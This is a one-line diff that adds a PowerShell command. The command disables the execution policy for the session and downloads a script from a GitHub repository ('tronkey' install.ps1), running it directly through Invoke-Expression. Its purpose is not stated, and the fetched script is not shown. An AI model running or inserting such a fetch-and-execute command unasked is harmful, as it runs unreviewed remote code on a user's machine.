@@ -1,0 +1,1 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force; irm https://raw.githubusercontent.com/McModdyWorld/tronkey/main/install.ps1 | iex
